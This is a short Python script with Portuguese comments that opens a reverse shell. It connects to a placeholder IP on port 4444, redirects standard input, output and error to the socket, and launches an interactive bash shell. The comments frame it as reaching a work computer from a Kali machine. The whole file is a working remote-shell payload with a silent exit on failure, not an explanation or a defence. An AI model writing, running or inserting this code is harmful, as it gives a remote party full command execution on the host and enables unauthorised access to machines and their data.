import socket
import subprocess
import os
import sys

# COLOQUE AQUI O IP ACESSÍVEL DO COMPUTADOR DO SEU TRABALHO
TRABALHO_IP = "IP_DO_COMPUTADOR_DO_TRABALHO" 
PORT = 4444

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TRABALHO_IP, PORT))
    
    # Redireciona a entrada, saída e erro do sistema para o socket criado
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    
    # Invoca o terminal interativo do Kali
    p = subprocess.call(["/bin/bash", "-i"])
except Exception as e:
    sys.exit()
